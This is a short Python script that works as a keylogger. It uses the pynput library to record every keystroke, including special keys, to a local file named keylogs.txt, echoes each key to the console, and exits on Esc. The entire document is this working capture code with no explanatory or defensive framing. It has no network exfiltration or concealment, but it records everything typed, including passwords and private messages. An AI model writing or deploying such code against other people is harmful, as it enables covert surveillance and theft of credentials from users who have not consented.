import os
from pynput import keyboard

file_path = os.path.join(os.path.dirname(__file__), 'keylogs.txt')

def on_press(key):
    try:
        with open(file_path, 'a') as f:
            f.write(key.char)
            print(f'Key pressed: {key.char}')
    except AttributeError:
        with open(file_path, 'a') as f:
            f.write(str(key))
            print(f'Special key pressed: {str(key)}')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        pass